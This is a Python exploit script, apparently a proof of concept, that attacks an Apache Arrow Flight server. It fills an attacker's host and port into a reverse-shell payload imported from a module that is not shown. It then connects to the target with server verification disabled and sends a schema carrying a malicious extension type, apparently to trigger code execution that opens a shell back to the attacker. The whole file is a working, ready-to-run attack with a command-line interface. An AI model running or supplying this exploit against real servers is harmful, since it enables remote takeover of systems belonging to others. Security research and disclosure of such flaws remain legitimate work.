import fire
import pyarrow as pa
import pyarrow.flight as flight

from common import REVSHELL_PAYLOAD, MaliciousStringType


def exploit(lhost: str, lport: int, rhost: str, rport: int, tls: bool = True) -> None:
    REVSHELL_PAYLOAD[2] = REVSHELL_PAYLOAD[2].format(LHOST=lhost, LPORT=lport)
    if tls:
        location = flight.Location.for_grpc_tls(rhost, rport)
    else:
        location = flight.Location.for_grpc_tcp(rhost, rport)
    client = flight.FlightClient(location, disable_server_verification=True)
    writer, _ = client.do_put(
        flight.FlightDescriptor.for_path(""),
        pa.schema([
            pa.field("", MaliciousStringType(REVSHELL_PAYLOAD))
        ])
    )
    writer.close()


if __name__ == "__main__":
    fire.Fire(exploit)
